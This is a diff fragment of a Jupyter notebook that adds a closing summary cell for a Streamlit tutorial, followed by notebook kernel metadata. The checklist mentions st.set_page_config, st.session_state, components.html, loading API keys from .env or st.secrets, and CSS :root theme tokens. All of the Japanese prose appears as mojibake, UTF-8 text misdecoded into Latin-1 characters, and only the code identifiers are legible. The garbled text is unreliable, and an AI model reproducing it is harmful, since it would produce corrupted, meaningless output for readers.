+   "id": "8495b314",
+   "metadata": {},
+   "source": [
+    "## ã¾ã¨ã‚ï¼šå­¦ç¿’ãƒã‚§ãƒƒã‚¯ãƒã‚¤ãƒ³ãƒˆ\n",
+    "\n",
+    "- `st.set_page_config` ã¨åŸºæœ¬ã‚¦ã‚£ã‚¸ã‚§ãƒƒãƒˆã®ä½¿ã„æ–¹ã‚’èª¬æ˜ã§ãã‚‹  \n",
+    "- `st.session_state` ã‚’ä½¿ã£ã¦çŠ¶æ…‹ã‚’ä¿æŒã™ã‚‹ç†ç”±ã‚’èª¬æ˜ã§ãã‚‹  \n",
+    "- `components.html` ã§ç”Ÿæˆã—ãŸ HTML/CSS ã‚’å®‰å…¨ã«ãƒ—ãƒ¬ãƒ“ãƒ¥ãƒ¼ã§ãã‚‹  \n",
+    "- `.env` ã¨ `st.secrets` ã®ä¸¡æ–¹ã«å¯¾å¿œã—ãŸ **APIã‚­ãƒ¼å–å¾—ãƒ‘ã‚¿ãƒ¼ãƒ³** ã‚’ç†è§£ã§ãã‚‹  \n",
+    "- `:root` ã® CSS ãƒˆãƒ¼ã‚¯ãƒ³è¨­è¨ˆã«ã‚ˆã‚Šã€Œãƒ†ãƒ¼ãƒã‚’å¾Œã‹ã‚‰ç´ æ—©ãå¤‰æ›´ã€ã§ãã‚‹ã“ã¨ã‚’èª¬æ˜ã§ãã‚‹\n",
+    "\n",
+    "> æ¬¡ã®ã‚¹ãƒ†ãƒƒãƒ—ï¼š`components.html` ã®å¿œç”¨ã€`st.cache_data` / `st.cache_resource` ã®ä½¿ã„åˆ†ã‘ã€  \n",
+    "> multipage æ§‹æˆï¼ˆ`pages/`ï¼‰ã‚„ `st.navigation` ã®æ¤œè¨ãªã©ã«ã‚‚æŒ‘æˆ¦ã—ã¦ã¿ã¾ã—ã‚‡ã†ã€‚\n"
+   ]
+  }
+ ],
+ "metadata": {
+  "kernelspec": {
+   "display_name": "base",
+   "language": "python",
+   "name": "python3"
+  },
+  "language_info": {
+   "codemirror_mode": {
+    "name": "ipython",
+    "version": 3
+   },
+   "file_extension": ".py",
+   "mimetype": "text/x-python",
+   "name": "python",
+   "nbconvert_exporter": "python",
+   "pygments_lexer": "ipython3",
+   "version": "3.11.4"
+  }
+ },
+ "nbformat": 4,
+ "nbformat_minor": 5
+}
